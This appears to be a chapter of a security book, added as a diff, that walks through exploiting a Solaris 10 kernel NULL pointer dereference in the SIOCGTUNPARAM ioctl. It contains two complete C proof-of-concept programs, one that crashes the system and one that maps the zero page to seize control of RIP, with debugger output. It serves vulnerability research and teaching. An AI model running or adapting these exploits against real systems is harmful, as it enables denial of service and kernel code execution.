@@ -1,0 +1,852 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>3.2 Exploitation</title><link rel="stylesheet" href="core.css" type="text/css"/><meta name="generator" content="DocBook XSL Stylesheets V1.74.0"/></head><body><div class="sect1" title="3.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id1"/>3.2 Exploitation</h1></div></div></div><p>Exploiting this bug was an exciting challenge. NULL pointer dereferences are usually labeled as unexploitable bugs because they can generally be used for a denial-of-service attack but not for arbitrary code execution. However, this NULL pointer dereference is different, as it can be successfully exploited for arbitrary code execution at the kernel level.</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The platform that I used throughout this section was the default installation of Solaris 10 10/08 x86/x64 DVD Full Image (sol-10-u6-ga1-x86-dvd.iso), which is called Solaris 10 Generic_137138-09</em></span>.</p></div><p>To exploit the vulnerability, I performed the following steps:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>Trigger the NULL pointer dereference for a denial of service.</p></li><li class="listitem"><p>Use the zero page to get control over <code class="literal">EIP</code>/<code class="literal">RIP</code>.</p></li></ol></div><div class="sect2" title="Step 1: Trigger the NULL Pointer Dereference for a Denial of Service"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_trigger_the_null_pointer_de"/>Step 1: Trigger the NULL Pointer Dereference for a Denial of Service</h2></div></div></div><p>To trigger the NULL pointer dereference, I wrote the following proof-of-concept (POC) code (see <a class="xref" href="ch03s02.html#proof-of-concept_code" title="Example 3-1. Proof-of-concept code (poc.c) that I wrote to trigger the NULL pointer dereference bug I found in Solaris">Example 3-1</a>).</p><div class="example"><a id="proof-of-concept_code"/><p class="title">Example 3-1. Proof-of-concept code (<span class="emphasis"><em>poc.c</em></span>) that I wrote to trigger the NULL pointer dereference bug I found in Solaris</p><div class="example-contents"><pre class="programlisting">01    #include &lt;stdio.h&gt;
+02    #include &lt;fcntl.h&gt;
+03    #include &lt;sys/syscall.h&gt;
+04    #include &lt;errno.h&gt;
+05    #include &lt;sys/sockio.h&gt;
+06    #include &lt;net/if.h&gt;
+07
+08    int
+09    main (void)
+10    {
+11           int       fd  = 0;
+12           char      data[32];
+13
+14           fd = open ("/dev/arp", O_RDWR);
+15
+16           if (fd &lt; 0) {
+17                   perror ("open");
+18                   return 1;
+19           }
+20
+21           // IOCTL data (interface name with invalid alias ":01")
+22           data[0] = 0x3a; // colon
+23           data[1] = 0x30; // ASCII zero
+24           data[2] = 0x31; // digit 1
+25           data[3] = 0x00; // NULL termination
+26
+27           // IOCTL call
+28           syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);
+29
+30           printf ("poc failed\n");
+31           close (fd);
+32
+33           return 0;
+34    }</pre></div></div><p>The POC code first opens the kernel network device <code class="literal">/dev/arp</code> (see line 14). Note that the devices <code class="literal">/dev/tcp</code> and <code class="literal">/dev/udp</code> also support the <code class="literal">SIOCGTUNPARAM</code> IOCTL and could therefore be used instead of <code class="literal">/dev/arp</code>. Next, the IOCTL data is prepared (see lines 22–25). The data consists of an interface name with invalid alias <code class="literal">:01</code> to trigger the bug. Finally the <code class="literal">SIOCGTUNPARAM</code> IOCTL is called and the IOCTL data is sent to the kernel (see line 28).</p><p>I then compiled and tested the POC code as an unprivileged user on a Solaris 10 64-bit system:</p><a id="I_programlisting3_d1e2545"/><pre class="programlisting">solaris$ <strong class="userinput"><code>isainfo -b</code></strong>
+64
+
+solaris$ <strong class="userinput"><code>id</code></strong>
+uid=100(wwwuser) gid=1(other)
+
+solaris$ <strong class="userinput"><code>uname -a</code></strong>
+SunOS bob 5.10 Generic_137138-09 i86pc i386 i86pc
+
+solaris$ <strong class="userinput"><code>/usr/sfw/bin/gcc -m64 -o poc poc.c</code></strong>
+
+solaris$ <strong class="userinput"><code>./poc</code></strong></pre><p>The system crashed immediately and rebooted. After the reboot, I logged in as root and inspected the kernel crash files with the help of Solaris Modular Debugger (mdb)<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-8" class="footnoteref">30</a>]</sup> (see Section B.1 for a description of the following debugger commands):<a id="IDX-CHP-3-0009" class="indexterm"/><a id="IDX-CHP-3-0010" class="indexterm"/><a id="IDX-CHP-3-0011" class="indexterm"/><a id="IDX-CHP-3-0012" class="indexterm"/></p><a id="I_programlisting3_d1e2579"/><pre class="programlisting">solaris# <strong class="userinput"><code>id</code></strong>
+uid=0(root) gid=0(root)
+
+solaris# <strong class="userinput"><code>hostname</code></strong>
+bob
+
+solaris# <strong class="userinput"><code>cd /var/crash/bob/</code></strong>
+
+solaris# <strong class="userinput"><code>ls</code></strong>
+bounds    unix.0    vmcore.0
+
+solaris# <strong class="userinput"><code>mdb unix.0 vmcore.0</code></strong>
+Loading modules: [ unix krtld genunix specfs dtrace cpu.generic
+ uppc pcplusmp ufs ip hook neti sctp arp usba fcp fctl nca lofs mpt zfs
+ random sppp audiosup nfs ptm md cpc crypto fcip logindmux ]</pre><p>I used the <code class="literal">::msgbuf</code> debugger command to display the message buffer, including all console messages up to the kernel panic:<a id="IDX-CHP-3-0013" class="indexterm"/></p><a id="I_programlisting3_d1e2604"/><pre class="programlisting">&gt; <strong class="userinput"><code>::msgbuf</code></strong>
+[..]
+panic[cpu0]/thread=ffffffff87d143a0:
+BAD TRAP: type=e (#pf Page fault) rp=fffffe8000f7e5a0 addr=8
+ occurred in module "ip" due to a <strong class="userinput"><code>NULL pointer dereference</code></strong>
+
+poc:
+#pf Page fault
+Bad kernel fault at addr=0x8
+pid=1380, pc=0xfffffffff6314c7c, sp=0xfffffe8000f7e690, eflags=0x10282
+cr0: 80050033&lt;pg,wp,ne,et,mp,pe&gt; cr4: 6b0&lt;xmme,fxsr,pge,pae,pse&gt;
+cr2: 8 cr3: 21a2a000 cr8: c
+        rdi:                0 rsi: ffffffff86bc0700 rdx: ffffffff86bc09c8
+        rcx:                0  r8: fffffffffbd0fdf8  r9: fffffe8000f7e780
+        rax:                c rbx: ffffffff883ff200 rbp: fffffe8000f7e6d0
+        r10:                1 r11:                0 r12: ffffffff8661f380
+        <strong class="userinput"><code>r13:                0</code></strong> r14: ffffffff8661f380 r15: ffffffff819f5b40
+        fsb: fffffd7fff220200 gsb: fffffffffbc27fc0  ds:                0
+         es:                0  fs:              1bb  gs:                0
+        trp:                e err:                0 <strong class="userinput"><code>rip: fffffffff6314c7c</code></strong>
+         cs:               28 rfl:            10282 rsp: fffffe8000f7e690
+         ss:               30
+
+fffffe8000f7e4b0 unix:die+da ()
+fffffe8000f7e590 unix:trap+5e6 ()
+fffffe8000f7e5a0 unix:_cmntrap+140 ()
+<strong class="userinput"><code>fffffe8000f7e6d0 ip:ip_sioctl_tunparam+5c ()</code></strong>
+fffffe8000f7e780 ip:ip_process_ioctl+280 ()
+fffffe8000f7e820 ip:ip_wput_nondata+970 ()
+fffffe8000f7e910 ip:ip_output_options+537 ()
+fffffe8000f7e920 ip:ip_output+10 ()
+fffffe8000f7e940 ip:ip_wput+37 ()
+fffffe8000f7e9a0 unix:putnext+1f1 ()
+fffffe8000f7e9d0 arp:ar_wput+9d ()
+fffffe8000f7ea30 unix:putnext+1f1 ()
+fffffe8000f7eab0 genunix:strdoioctl+67b ()
+fffffe8000f7edd0 genunix:strioctl+620 ()
+fffffe8000f7edf0 specfs:spec_ioctl+67 ()
+fffffe8000f7ee20 genunix:fop_ioctl+25 ()
+fffffe8000f7ef00 genunix:ioctl+ac ()
+fffffe8000f7ef10 unix:brand_sys_syscall+21d ()
+
+syncing file systems...
+ done
+dumping to /dev/dsk/c0d0s1, offset 107413504, content: kernel</pre><p>The debugger output shows that the kernel panic happened due to a NULL pointer dereference at address <code class="literal">0xfffffffff6314c7c</code> (see the value of the <code class="literal">RIP</code> register). Next, I asked the debugger to display the instruction at that address:</p><a id="I_programlisting3_d1e2630"/><pre class="programlisting">&gt; <strong class="userinput"><code>0xfffffffff6314c7c::dis</code></strong>
+ip_sioctl_tunparam+0x30:        jg     +0xf0    &lt;ip_sioctl_tunparam+0x120&gt;
+ip_sioctl_tunparam+0x36:        movq   0x28(%r12),%rax
+ip_sioctl_tunparam+0x3b:        movq   0x28(%rbx),%rbx
+ip_sioctl_tunparam+0x3f:        movq   %r12,%rdi
+ip_sioctl_tunparam+0x42:        movb   $0xe,0x19(%rax)
+ip_sioctl_tunparam+0x46:        call   +0x5712cfa       &lt;copymsg&gt;
+ip_sioctl_tunparam+0x4b:        movq   %rax,%r15
+ip_sioctl_tunparam+0x4e:        movl   $0xc,%eax
+ip_sioctl_tunparam+0x53:        testq  %r15,%r15
+ip_sioctl_tunparam+0x56:        je     +0x9d    &lt;ip_sioctl_tunparam+0xf3&gt;
+<strong class="userinput"><code>ip_sioctl_tunparam+0x5c:        movq   0x8(%r13),%r14</code></strong>
+[..]</pre><p>The crash was caused by the instruction <code class="literal">movq 0x8(%r13),%r14</code> at address <code class="literal">ip_sioctl_tunparam+0x5c</code>. The instruction tried to reference the value pointed to by register <code class="literal">r13</code>. As the debugger output of the <code class="literal">::msgbuf</code> command shows, <code class="literal">r13</code> had the value 0 at the time of the crash. So the assembler instruction is equivalent to the NULL pointer dereference that happens in <code class="literal">ip_sioctl_tunparam()</code> (see line 9432 in the following code snippet).</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>uts/common/inet/ip/ip_if.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">ip_sioctl_tunparam()</code></p></dd></dl></div><a id="I_programlisting3_d1e2676"/><pre class="programlisting">[..]
+9401    int
+9402    ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,
+9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)
+9404    {
+[..]
+<strong class="userinput"><code>9432        ill = ipif-&gt;ipif_ill;</code></strong>
+[..]</pre><p>I was able to demonstrate that this bug can be successfully exploited by an unprivileged user to crash the system. Because all Solaris Zones share the same kernel, it’s also possible to crash the whole system (all zones), even if the vulnerability is triggered in an unprivileged, non-global zone (see Section C.3 for more information on the Solaris Zones technology). Any hosting provider using the Solaris Zones functionality could be greatly impacted if it were exploited by someone with malicious intent.<a id="IDX-CHP-3-0014" class="indexterm"/></p></div><div class="sect2" title="Step 2: Use the Zero Page to Get Control over EIP/RIP"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_use_the_zero_page_to_get_co"/>Step 2: Use the Zero Page to Get Control over EIP/RIP</h2></div></div></div><p>After I was able to crash the system, I decided to attempt arbitrary code execution. To do this, I had to solve the following two problems:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Prevent the system from crashing as the NULL pointer dereference gets triggered.</p></li><li class="listitem"><p>Take control over <code class="literal">EIP</code>/<code class="literal">RIP</code>.</p></li></ul></div><p>The system crash is caused by the NULL pointer dereference. As the zero or NULL page is normally not mapped, the dereference leads to an access violation that crashes the system (see also Section A.2). All I had to do to prevent the system from crashing was to map the zero page before triggering the NULL pointer dereference. This can be done easily on the x86 and AMD64 architecture, because Solaris segregates the virtual address space of processes on these platforms into two parts: user space and kernel space (see <a class="xref" href="ch03s02.html#virtual_address_space_of_a_process_open" title="Figure 3-5. Virtual address space of a process (Solaris x86 64-bit)">Figure 3-5</a>). User space is where all user-mode applications run, while kernel space is where the kernel itself, as well as kernel extensions (e.g., drivers), run. However, the kernel and the user space of a process share the same zero page.<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-9" class="footnoteref">31</a>]</sup><a id="IDX-CHP-3-0015" class="indexterm"/><a id="IDX-CHP-3-0016" class="indexterm"/><a id="IDX-CHP-3-0017" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p>Each user-mode address space is unique to a particular process, while the kernel address space is shared across all processes. Mapping the NULL page in one process only causes it to be mapped in that process’s address space only.</p></div><div class="figure"><a id="virtual_address_space_of_a_process_open"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject3_d1e2725"/><img src="httpatomoreillycomsourcenostarchimages939257.png.jpg" alt="Virtual address space of a process (Solaris x86 64-bit)"/></div></div><p class="title">Figure 3-5. Virtual address space of a process (Solaris x86 64-bit)<sup>[<a href="ch03s05.html#ftn.CHP-3-FN-10" class="footnoteref">32</a>]</sup></p></div><p>By mapping the zero page before triggering the NULL pointer dereference, I was able to prevent the system from crashing. That got me to the next problem: How to gain control over <code class="literal">EIP</code>/<code class="literal">RIP</code>? The only data that was under my full control was the IOCTL data sent to the kernel and the user-space data of a process, including the zero page. The only way to get control was to make the kernel reference some data from the zero page that would later be used to control the execution flow of the kernel. I thought that approach would not work, but I was wrong.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>uts/common/inet/ip/ip_if.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">ip_sioctl_tunparam()</code></p></dd></dl></div><a id="I_programlisting3_d1e2755"/><pre class="programlisting">[..]
+9401    int
+9402    ip_sioctl_tunparam(ipif_t *ipif, sin_t *dummy_sin, queue_t *q, mblk_t *mp,
+9403        ip_ioctl_cmd_t *ipip, void *dummy_ifreq)
+9404    {
+[..]
+<strong class="userinput"><code>9432        ill = ipif-&gt;ipif_ill;</code></strong>
+9433        mutex_enter(&amp;connp-&gt;conn_lock);
+9434        mutex_enter(&amp;ill-&gt;ill_lock);
+9435        if (ipip-&gt;ipi_cmd == SIOCSTUNPARAM || ipip-&gt;ipi_cmd == OSIOCSTUNPARAM) {
+9436            success = ipsq_pending_mp_add(connp, ipif, CONNP_TO_WQ(connp),
+9437                mp, 0);
+9438        } else {
+9439            success = ill_pending_mp_add(ill, connp, mp);
+9440        }
+9441        mutex_exit(&amp;ill-&gt;ill_lock);
+9442        mutex_exit(&amp;connp-&gt;conn_lock);
+9443
+9444        if (success) {
+9445            ip1dbg(("sending down tunparam request "));
+<strong class="userinput"><code>9446            putnext(ill-&gt;ill_wq, mp1);</code></strong>
+[..]</pre><p>The NULL pointer dereference happens in line 9432, when <code class="literal">ipif</code> is forced to be <code class="literal">NULL</code>. This leads to the system crash. But if the zero page is mapped before <code class="literal">NULL</code> is dereferenced, the access violation won’t be triggered, and the system won’t crash. Instead, the value of the <code class="literal">ill</code> structure is determined while referencing valid user-controlled data from the zero page. Therefore, all values of the <code class="literal">ill</code> structure can be controlled by carefully crafting the zero page data. I was pleased to find that in line 9446, the function <code class="literal">putnext()</code> is called with the user-controllable value of <code class="literal">ill-&gt;ill_wq</code> as a parameter.</p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>uts/common/os/putnext.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">putnext()</code><sup>[<a href="ch03s05.html#ftn.CHP-3-FN-11" class="footnoteref">33</a>]</sup></p></dd></dl></div><a id="I_programlisting3_d1e2806"/><pre class="programlisting">[..]
+146    void
+<strong class="userinput"><code>147    putnext(queue_t *qp, mblk_t *mp)</code></strong>
+148    {
+[..]
+<strong class="userinput"><code>154        int        (*putproc)();</code></strong>
+[..]
+<strong class="userinput"><code>176        qp = qp-&gt;q_next;</code></strong>
+<strong class="userinput"><code>177        sq = qp-&gt;q_syncq;</code></strong>
+178        ASSERT(sq != NULL);
+179        ASSERT(MUTEX_NOT_HELD(SQLOCK(sq)));
+<strong class="userinput"><code>180        qi = qp-&gt;q_qinfo;</code></strong>
+[..]
+268        /*
+269         * We now have a claim on the syncq, we are either going to
+270         * put the message on the syncq and then drain it, or we are
+271         * going to call the putproc().
+272         */
+<strong class="userinput"><code>273        putproc = qi-&gt;qi_putp;</code></strong>
+274        if (!queued) {
+275            STR_FTEVENT_MSG(mp, fqp, FTEV_PUTNEXT, mp-&gt;b_rptr -
+276                mp-&gt;b_datap-&gt;db_base);
+<strong class="userinput"><code>277            (*putproc)(qp, mp);</code></strong>
+[..]</pre><p>The user can fully control the data of the first function parameter of <code class="literal">putnext()</code>, which means that the values of <code class="literal">qp</code>, <code class="literal">sq</code>, and <code class="literal">qi</code> can also be controlled through the data of the mapped zero page (see lines 176, 177, and 180). Furthermore, the user can control the value of the function pointer declared in line 154 (see line 273). This function pointer is then called in line 277.</p><p>So, in summary, if the data of the mapped zero page is carefully crafted, it’s possible to take control of a function pointer, thereby gaining full control over <code class="literal">EIP</code>/<code class="literal">RIP</code> and resulting in arbitrary code execution at the kernel level.</p><p>I used the following POC code to gain control over <code class="literal">EIP</code>/<code class="literal">RIP</code>:</p><div class="example"><a id="poc_code_open_parenthesis"/><p class="title">Example 3-2. POC code (<span class="emphasis"><em>poc2.c</em></span>) used to gain control of EIP/RIP and thereby achieve arbitrary code execution at the kernel.</p><div class="example-contents"><pre class="programlisting">01    #include &lt;string.h&gt;
+ 02    #include &lt;stdio.h&gt;
+ 03    #include &lt;unistd.h&gt;
+ 04    #include &lt;fcntl.h&gt;
+ 05    #include &lt;sys/syscall.h&gt;
+ 06    #include &lt;sys/sockio.h&gt;
+ 07    #include &lt;net/if.h&gt;
+ 08    #include &lt;sys/mman.h&gt;
+ 09
+ 10    ////////////////////////////////////////////////
+ 11    // Map the zero page and fill it with the
+ 12    // necessary data
+ 13    int
+ 14    map_null_page (void)
+ 15    {
+ 16      void *  mem = (void *)-1;
+ 17
+ 18      // map the zero page
+ 19      mem = mmap (NULL, PAGESIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
+ 20                  MAP_FIXED|MAP_PRIVATE|MAP_ANON, −1, 0);
+ 21
+ 22      if (mem != NULL) {
+ 23        printf ("failed\n");
+ 24        fflush (0);
+ 25        perror ("[-] ERROR: mmap");
+ 26        return 1;
+ 27      }
+ 28
+ 29      // fill the zero page with zeros
+ 30      memset (mem, 0x00, PAGESIZE);
+ 31
+ 32      ////////////////////////////////////////////////
+ 33      // zero page data
+ 34
+ 35      // qi-&gt;qi_putp
+ 36      *(unsigned long long *)0x00 = 0x0000000041414141;
+ 37
+ 38      // ipif-&gt;ipif_ill
+ 39      *(unsigned long long *)0x08 = 0x0000000000000010;
+ 40
+ 41      // start of ill struct (ill-&gt;ill_ptr)
+ 42      *(unsigned long long *)0x10 = 0x0000000000000000;
+ 43
+ 44      // ill-&gt;rq
+ 45      *(unsigned long long *)0x18 = 0x0000000000000000;
+ 46
+ 47      // ill-&gt;wq (sets address for qp struct)
+ 48      *(unsigned long long *)0x20 = 0x0000000000000028;
+ 49
+ 50      // start of qp struct (qp-&gt;q_info)
+ 51      *(unsigned long long *)0x28 = 0x0000000000000000;
+ 52
+ 53      // qp-&gt;q_first
+ 54      *(unsigned long long *)0x30 = 0x0000000000000000;
+ 55
+ 56      // qp-&gt;q_last
+ 57      *(unsigned long long *)0x38 = 0x0000000000000000;
+ 58
+ 59      // qp-&gt;q_next (points to the start of qp struct)
+ 60      *(unsigned long long *)0x40 = 0x0000000000000028;
+ 61
+ 62      // qp-&gt;q_syncq
+ 63      *(unsigned long long *)0xa0 = 0x00000000000007d0;
+ 64
+ 65      return 0;
+ 66    }
+ 67
+ 68    void
+ 69    status (void)
+ 70    {
+ 71      unsigned long long  i = 0;
+ 72
+ 73      printf ("[+] PAGESIZE: %d\n", (int)PAGESIZE);
+ 74      printf ("[+] Zero page data:\n");
+ 75
+ 76      for (i = 0; i &lt;= 0x40; i += 0x8)
+ 77        printf ("... 0x%02x: 0x%016llx\n", i, *(unsigned long long*)i);
+ 78
+ 79      printf ("... 0xa0: 0x%016llx\n", *(unsigned long long*)0xa0);
+ 80
+ 81      printf ("[+] The bug will be triggered in 2 seconds..\n");
+ 82
+ 83      fflush (0);
+ 84    }
+ 85
+ 86    int
+ 87    main (void)
+ 88    {
+ 89      int   fd  = 0;
+ 90      char  data[32];
+ 91
+ 92      ////////////////////////////////////////////////
+ 93      // Opening the '/dev/arp' device
+ 94      printf ("[+] Opening '/dev/arp' device .. ");
+ 95
+ 96      fd = open ("/dev/arp", O_RDWR);
+ 97
+ 98      if (fd &lt; 0) {
+ 99        printf ("failed\n");
+100        fflush (0);
+101        perror ("[-] ERROR: open");
+102        return 1;
+103      }
+104
+105      printf ("OK\n");
+106
+107      ////////////////////////////////////////////////
+108      // Map the zero page
+109      printf ("[+] Trying to map zero page .. ");
+110
+111      if (map_null_page () == 1) {
+112        return 1;
+113      }
+114
+115      printf ("OK\n");
+116
+117      ////////////////////////////////////////////////
+118      // Status messages
+119      status ();
+120      sleep (2);
+121
+122      ////////////////////////////////////////////////
+123      // IOCTL request data (interface name with invalid alias ':01')
+124      data[0] = 0x3a; // colon
+125      data[1] = 0x30; // ASCII zero
+126      data[2] = 0x31; // the digit '1'
+127      data[3] = 0x00; // NULL termination
+128
+129      ////////////////////////////////////////////////
+130      // IOCTL request
+131      syscall (SYS_ioctl, fd, SIOCGTUNPARAM, data);
+132
+133      printf ("[-] ERROR: triggering the NULL ptr deref failed\n");
+134      close (fd);
+135
+136      return 0;
+137    }</pre></div></div><p>In line 19 of <a class="xref" href="ch03s02.html#poc_code_open_parenthesis" title="Example 3-2. POC code (poc2.c) used to gain control of EIP/RIP and thereby achieve arbitrary code execution at the kernel.">Example 3-2</a>, the zero page is mapped using <code class="literal">mmap()</code>. But the most interesting part of the POC code is the layout of the zero page data (see lines 32–63). <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a> illustrates the relevant parts of this layout.<a id="IDX-CHP-3-0018" class="indexterm"/></p><div class="figure"><a id="data_layout_of_the_zero_page"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject3_d1e2883"/><img src="httpatomoreillycomsourcenostarchimages939259.png.jpg" alt="Data layout of the zero page"/></div></div><p class="title">Figure 3-6. Data layout of the zero page</p></div><p>The left-hand side of <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a> shows the offsets into the zero page. The middle lists the actual values of the zero page. The right-hand side shows the references the kernel makes into the zero page. <a class="xref" href="ch03s02.html#description_of_the_zero_page_data_layout" title="Table 3-1. Description of the Zero Page Data Layout">Table 3-1</a> describes the zero page data layout illustrated in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>.</p><div class="table"><a id="description_of_the_zero_page_data_layout"/><p class="title">Table 3-1. Description of the Zero Page Data Layout</p><div class="table-contents"><table summary="Description of the Zero Page Data Layout" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Function/Line of code</p></th><th style="text-align: left" valign="bottom"><p>Data referenced by the kernel</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">ip_sioctl_tunparam()</code></p>
+<p>9432</p></td><td style="text-align: left" valign="top"><p><code class="literal">ill = ipif-&gt; ipif_ill;</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ipif</code> is <code class="literal">NULL</code>, and the offset of <code class="literal">ipif_ill</code> within the <code class="literal">ipif</code> structure is <code class="literal">0x8</code>. Therefore, <code class="literal">ipif-&gt;ipif_ill</code> references address <code class="literal">0x8</code>. The value at address <code class="literal">0x8</code> is assigned to <code class="literal">ill</code>. So the <code class="literal">ill</code> structure starts at address <code class="literal">0x10</code> (see (1) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">ip_sioctl_tunparam()</code></p>
+<p>9446</p></td><td style="text-align: left" valign="top"><p><code class="literal">putnext(ill-&gt; ill_wq, mp1);</code></p></td><td style="text-align: left" valign="top"><p>The value of <code class="literal">ill-&gt;ill_wq</code> is used as a parameter for <code class="literal">putnext()</code>. The offset of <code class="literal">ill_wq</code> inside the <code class="literal">ill</code> structure is <code class="literal">0x10</code>. The <code class="literal">ill</code> structure starts at address <code class="literal">0x10</code>, so <code class="literal">ill-&gt;ill_wq</code> is referenced at address <code class="literal">0x20</code>.</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>147</p></td><td style="text-align: left" valign="top"><p><code class="literal">putnext(queue_t *qp, mblk_t *mp)</code></p></td><td style="text-align: left" valign="top"><p>The address of <code class="literal">qp</code> equals the value pointed to by <code class="literal">ill-&gt;ill_wq</code>. Therefore, <code class="literal">qp</code> starts at address <code class="literal">0x28</code> (see (2) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>176</p></td><td style="text-align: left" valign="top"><p><code class="literal">qp = qp-&gt;q_next;</code></p></td><td style="text-align: left" valign="top"><p>The offset of <code class="literal">q_next</code> inside the <code class="literal">qp</code> structure is <code class="literal">0x18</code>. Therefore, the next <code class="literal">qp</code> gets assigned the value from address <code class="literal">0x40:</code> the start address of <code class="literal">qp</code> (<code class="literal">0x28</code>) + offset of <code class="literal">q_next</code> (<code class="literal">0x18</code>). The value at address <code class="literal">0x40</code> is again <code class="literal">0x28</code>, so the next <code class="literal">qp</code> structure starts at the same address as the one before (see (3) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>177</p></td><td style="text-align: left" valign="top"><p><code class="literal">sq = qp-&gt;q_syncq;</code></p></td><td style="text-align: left" valign="top"><p>The offset of <code class="literal">q_syncq</code> inside the <code class="literal">qp</code> structure is <code class="literal">0x78</code>. Since <code class="literal">q_syncq</code> is referenced later, it has to point to a valid memory address. I chose <code class="literal">0x7d0</code>, which is an address in the mapped zero page.</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>180</p></td><td style="text-align: left" valign="top"><p><code class="literal">qi = qp-&gt;q_qinfo;</code></p></td><td style="text-align: left" valign="top"><p>The value of <code class="literal">qp-&gt;q_qinfo</code> is assigned to <code class="literal">qi</code>. The offset of <code class="literal">q_qinfo</code> inside the <code class="literal">qp</code> structure is <code class="literal">0x0</code>. Since the <code class="literal">qp</code> structure starts at address <code class="literal">0x28</code>, the value <code class="literal">0x0</code> is assigned to <code class="literal">qi</code> (see (4) in <a class="xref" href="ch03s02.html#data_layout_of_the_zero_page" title="Figure 3-6. Data layout of the zero page">Figure 3-6</a>).</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">putnext()</code></p>
+<p>273</p></td><td style="text-align: left" valign="top"><p><code class="literal">putproc = qi-&gt; qi_putp;</code></p></td><td style="text-align: left" valign="top"><p>The value of <code class="literal">qi-&gt;qi_putp</code> is assigned to the function pointer <code class="literal">putproc</code>. The offset of <code class="literal">qi_putp</code> inside the <code class="literal">qi</code> structure is <code class="literal">0x0</code>. Therefore, <code class="literal">qi-&gt;qi_putp</code> is referenced at address <code class="literal">0x0</code>, <code class="literal">and</code> the value at this address (<code class="literal">0x0000000041414141</code>) is assigned to the function pointer.</p></td></tr></tbody></table></div></div><p>I then compiled and tested the POC code as an unprivileged user inside a restricted, non-global Solaris Zone:</p><a id="I_programlisting3_d1e3212"/><pre class="programlisting">solaris$ <strong class="userinput"><code>isainfo -b</code></strong>
+64
+
+solaris$ <strong class="userinput"><code>id</code></strong>
+uid=100(wwwuser) gid=1(other)
+
+solaris$ <strong class="userinput"><code>zonename</code></strong>
+wwwzone
+
+solaris$ <strong class="userinput"><code>ppriv -S $$</code></strong>
+1422:   -bash
+flags = &lt;none&gt;
+        E: basic
+        I: basic
+        P: basic
+        L: zone
+
+solaris$ <strong class="userinput"><code>/usr/sfw/bin/gcc -m64 -o poc2 poc2.c</code></strong>
+
+solaris$ <strong class="userinput"><code>./poc2</code></strong>
+[+] Opening '/dev/arp' device .. OK
+[+] Trying to map zero page .. OK
+[+] PAGESIZE: 4096
+[+] Zero page data:
+... 0x00: 0x0000000041414141
+... 0x08: 0x0000000000000010
+... 0x10: 0x0000000000000000
+... 0x18: 0x0000000000000000
+... 0x20: 0x0000000000000028
+... 0x28: 0x0000000000000000
+... 0x30: 0x0000000000000000
+... 0x38: 0x0000000000000000
+... 0x40: 0x0000000000000028
+... 0xa0: 0x00000000000007d0
+[+] The bug will be triggered in 2 seconds..</pre><p>The system crashed immediately and rebooted. After the reboot, I inspected the kernel crash files (see Section B.1 for a description of the following debugger commands):</p><a id="I_programlisting3_d1e3236"/><pre class="programlisting">solaris# <strong class="userinput"><code>id</code></strong>
+uid=0(root) gid=0(root)
+
+solaris# <strong class="userinput"><code>hostname</code></strong>
+bob
+
+solaris# <strong class="userinput"><code>cd /var/crash/bob/</code></strong>
+
+solaris# <strong class="userinput"><code>ls</code></strong>
+bounds    unix.0    vmcore.0    unix.1    vmcore.1
+
+solaris# <strong class="userinput"><code>mdb unix.1 vmcore.1</code></strong>
+Loading modules: [ unix krtld genunix specfs dtrace cpu.generic uppc
+ pcplusmp ufs ip hook neti sctp arp usba fcp fctl nca lofs mpt zfs
+ audiosup md cpc random crypto fcip logindmux ptm sppp nfs ]
+
